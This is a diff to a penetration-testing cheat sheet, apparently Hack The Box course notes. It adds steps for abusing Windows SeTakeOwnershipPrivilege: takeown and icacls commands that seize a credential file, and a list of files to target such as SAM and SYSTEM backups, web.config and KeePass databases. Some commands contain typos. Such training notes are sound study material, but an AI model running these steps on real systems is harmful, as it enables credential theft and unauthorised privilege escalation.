@@ -2924,7 +2924,7 @@ apt update hooking (PreInvoke)
 | SeLoadDriverPrivilege | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers) | Administrators | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code. |
 | SeRestorePrivilege | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories) | Administrators | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object. |
 
-##### Enabling SeTakeOvershipPrivilege
+##### Enabling SeTakeOwnershipPrivilege
 
 | **Command** | **Description** |
 | --- | --- |
@@ -2932,6 +2932,31 @@ apt update hooking (PreInvoke)
 | `Import-Mobule .\Enable-Privilege.ps1` |  Import module with powershell |
 | `.\EnablingAllTokenPrivs.ps1` | Run script |
 | `whoami /priv` | Check privilege |
+
+##### Takeover File Ownership
+
+| **Command** | **Description** |
+| --- | --- |
+| `Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' \| Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}` | Check details of specific file |
+| `cmd /c dir /q 'C:\Department Shares\Private\IT'` | Get ownership of Directory |
+| `takeown /f 'C:\Department Shares\Private\IT\cred.txt'` | Take ownership, SeTakeOwnershipPrivilege necessary |
+| `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F` | Modify ACL to allow file to be viewed by user |
+| `cat 'C:\Department Shares\Private\IT\cred.txt'`| View file |
+
+Some files which are good to target include:
+
+```
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav5
+
+We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
+```
 
 ### Handy Commands
 
